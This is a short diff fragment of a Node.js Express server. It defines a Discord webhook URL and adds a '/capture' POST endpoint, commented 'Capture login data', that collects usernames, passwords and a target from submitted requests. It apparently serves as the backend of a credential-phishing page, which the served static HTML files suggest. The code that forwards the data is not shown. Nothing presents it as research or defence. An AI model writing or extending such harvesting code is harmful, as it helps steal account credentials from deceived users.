@@ -10,9 +10,10 @@ const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1489947599749382146/wm
 app.use(cors());
 app.use(express.json());
 
-// Serve your static files (index.html and 1.html)
+// Serve static files (index.html and 1.html)
 app.use(express.static(__dirname));
 
+// Capture login data
 app.post('/capture', async (req, res) => {
     const { username, password, target, time } = req.body;
 
